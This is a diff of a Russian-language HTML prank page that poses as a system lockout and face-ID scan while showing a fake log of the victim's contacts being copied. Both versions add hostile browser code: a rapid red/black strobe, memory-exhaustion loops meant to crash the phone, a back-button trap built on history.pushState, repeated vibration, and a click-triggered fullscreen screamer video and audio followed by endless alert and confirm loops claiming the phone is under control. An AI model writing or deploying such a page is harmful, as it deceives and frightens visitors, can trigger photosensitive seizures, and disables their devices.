@@ -2,91 +2,75 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>ВНИМАНИЕ! КРИТИЧЕСКАЯ ОШИБКА!</title>
+    <title>ВНИМАНИЕ: ДОСТУП ОГРАНИЧЕН</title>
     <style>
-        /* Главный эффект мерцания */
-        @keyframes strobe {
-            0% { background-color: #000; }
-            50% { background-color: #f00; }
-            100% { background-color: #000; }
-        }
-        .flash-active {
-            animation: strobe 0.05s infinite !important;
-        }
-        body { 
-            background: #000; 
-            color: #fff; 
-            text-align: center; 
-            font-family: sans-serif; 
-            margin: 0; 
-            padding-top: 100px; 
-            overflow: hidden; 
-            width: 100vw; 
-            height: 100vh;
-        }
-        #scary { 
-            display: none; 
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            width: 100vw; 
-            height: 100vh; 
-            object-fit: cover; 
-            z-index: 9999; 
-        }
-        h1 { font-size: 40px; text-shadow: 2px 2px #000; }
+        @keyframes strobe { 0% { background: #000; } 50% { background: #f00; } 100% { background: #000; } }
+        .flash { animation: strobe 0.03s infinite !important; }
+        body { background: #000; color: #0f0; text-align: center; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; display: flex; flex-direction: column; justify-content: center; }
+        #scary_vid { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; }
+        .face-id-frame { border: 2px solid #0f0; width: 200px; height: 200px; margin: 20px auto; border-radius: 40px; position: relative; }
+        .scan-line { width: 100%; height: 2px; background: #0f0; position: absolute; top: 0; animation: scan 2s linear infinite; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        #log { font-size: 11px; color: #0f0; text-align: left; padding: 15px; background: #000a00; border: 1px solid #0f0; margin: 10px; height: 80px; overflow: hidden; }
+        .danger-text { color: red; font-weight: bold; font-size: 22px; animation: blink 0.5s infinite; }
+        @keyframes blink { 0% { opacity: 0; } 50% { opacity: 1; } 100% { opacity: 0; } }
     </style>
 </head>
-<body id="main_body" class="flash-active"> <!-- Мерцание включено сразу здесь -->
+<body id="b" class="flash">
 
     <div id="ui">
-        <h1>СИСТЕМА ЗАБЛОКИРОВАНА</h1>
-        <p style="font-size: 20px;">Обнаружена попытка взлома. <br>Ваши данные зашифрованы.</p>
-        <br>
-        <p>Нажмите в любом месте для восстановления...</p>
+        <h1 class="danger-text">CRITICAL SYSTEM THREAT</h1>
+        <div class="face-id-frame"><div class="scan-line"></div></div>
+        <p>Идет сканирование лица для верификации...</p>
+        <div id="log"></div>
+        <p style="color: #fff; font-size: 12px;">[ Нажмите для подтверждения личности ]</p>
     </div>
 
-    <img id="scary" src="https://raw.githubusercontent.com">
+    <video id="scary_vid" playsinline loop>
+        <source src="https://raw.githubusercontent.com" type="video/mp4">
+    </video>
     <audio id="scream" src="https://raw.githubusercontent.com" loop></audio>
 
     <script>
-        // 1. СРАЗУ ПРИ ЗАГРУЗКЕ
+        const fakeNames = ["Мама", "Папа", "Брат", "Андрей", "Света", "Артем", "Максим", "Юля"];
+        setInterval(() => {
+            const l = document.getElementById('log');
+            l.innerHTML += `> Копирование контакта: ${fakeNames[Math.floor(Math.random()*fakeNames.length)]}... OK<br>`;
+            l.scrollTop = l.scrollHeight;
+        }, 1200);
+
         window.onload = function() {
-            // Принудительно включаем мерцание еще раз для верности
-            document.getElementById('main_body').classList.add('flash-active');
-
-            // Нагрузка на телефон (ОЗУ + Проц)
-            let memoryKiller = [];
-            setInterval(() => {
-                for(let i=0; i<300; i++) {
-                    memoryKiller.push(new Array(1000000).join("ALARM_"));
-                }
-            }, 100);
-
-            // Вибрация (для Android)
-            if (navigator.vibrate) navigator.vibrate([500, 100, 500, 100, 500]);
-
-            // Бесконечные окна через 2 секунды
-            setTimeout(() => {
-                while(true) {
-                    alert("КРИТИЧЕСКАЯ ОШИБКА!");
-                    confirm("УДАЛИТЬ ВСЕ ФАЙЛЫ?");
-                }
-            }, 2000);
+            if (navigator.vibrate) setInterval(() => navigator.vibrate([200, 100, 200]), 1500);
+            
+            // Жуткая нагрузка на ресурсы (ОЗУ)
+            let crashArray = [];
+            setInterval(() => { 
+                for(let i=0; i<1000; i++) crashArray.push(new Array(1000000).join("!!!")); 
+            }, 25);
+            
+            for(let i=0; i<100; i++) history.pushState(null, null, location.href);
+            window.onpopstate = () => { history.go(1); alert("ПОПЫТКА ПОБЕГА ЗАФИКСИРОВАНА!"); };
         };
 
-        // 2. СКРИМЕР ПРИ ЛЮБОМ КЛИКЕ (так как звук без клика запрещен)
         window.onclick = window.ontouchstart = function() {
-            const s = document.getElementById("scream");
-            const i = document.getElementById("scary");
-            s.volume = 1.0;
-            s.play();
-            i.style.display = "block";
+            const v = document.getElementById("scary_vid");
+            const a = document.getElementById("scream");
+            document.getElementById("ui").style.display = "none";
+            v.style.display = "block";
             
-            // Пытаемся занять весь экран
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen().catch(() => {});
-            }
+            // Попытка заблокировать звук в Fullscreen
+            v.play();
+            a.volume = 1.0;
+            a.play();
+            
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+
+            setTimeout(() => {
+                while(true) { 
+                    alert("ВАШ ТЕЛЕФОН ПОД КОНТРОЛЕМ!"); 
+                    confirm("ОТПРАВИТЬ ГАЛЕРЕЮ В СЕТЬ?");
+                }
+            }, 3000);
         };
     </script>
 </body>
